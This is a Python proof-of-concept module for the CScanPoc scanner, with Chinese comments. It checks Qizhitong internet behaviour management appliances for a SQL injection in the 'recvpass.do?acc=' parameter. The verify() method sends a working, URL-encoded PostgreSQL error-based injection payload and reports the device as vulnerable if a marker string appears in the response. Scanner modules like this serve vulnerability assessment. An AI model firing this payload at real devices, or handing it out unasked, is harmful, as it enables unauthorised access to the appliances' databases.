# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'QZT360_0003'  # 平台漏洞编号，留空
    name = ' 企智通系列上网行为管理设备 通用型SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-09-09'  # 漏洞公布时间
    desc = '''
        企智通系列上网行为管理设备 /recvpass.do?acc= 存在SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '企智通上网行为管理设备'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4d60588b-cc01-42bc-9e9e-ba298f06960c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer: http://www.wooyun.org/bugs/wooyun-2015-0139442
            payload = '/recvpass.do?acc=adminaaa%27%20AND%207798=CAST((CHR(113)||CHR(118)||CHR(107)||CHR(113)||CHR(113))||(SELECT%20(CASE%20WHEN%20(7798=7798)%20THEN%201%20ELSE%200%20END))::text||(CHR(113)||CHR(106)||CHR(107)||CHR(106)||CHR(113))%20AS%20NUMERIC)%20AND%20%27slur%27=%27slur&mail=admin@a.com&usbkey='
            verify_url = self.target + payload
            req = requests.get(verify_url)

            if req.status_code == 200 and 'qvkqq1qjkjq' in req.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
